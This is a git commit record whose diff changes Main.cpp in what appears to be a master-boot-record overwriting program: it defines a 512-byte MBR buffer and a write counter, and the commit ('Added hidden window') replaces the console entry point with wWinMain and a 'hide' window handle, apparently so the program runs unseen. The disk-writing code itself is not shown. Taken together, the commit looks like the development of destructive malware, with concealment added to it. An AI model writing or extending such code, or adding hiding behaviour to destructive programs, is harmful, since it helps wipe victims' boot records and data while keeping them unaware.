97e66921a5ab6262d0cfb15249a3794ed56f92fd
СтранныйРусский <87149262+LukeChemeriov@users.noreply.github.com>
2021-10-02 17:45:24 +0100

    Update Main.cpp
    Added hidden window

--- Main.cpp
+++ Main.cpp
@@ -2,8 +2,8 @@
 using namespace std;
 #define MBR_SIZE 512
 
-int main() {
-
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
+    HWND hide;
     DWORD write;
     char mbrData[MBR_SIZE]; 
     ZeroMemory(&mbrData, sizeof(mbrData));
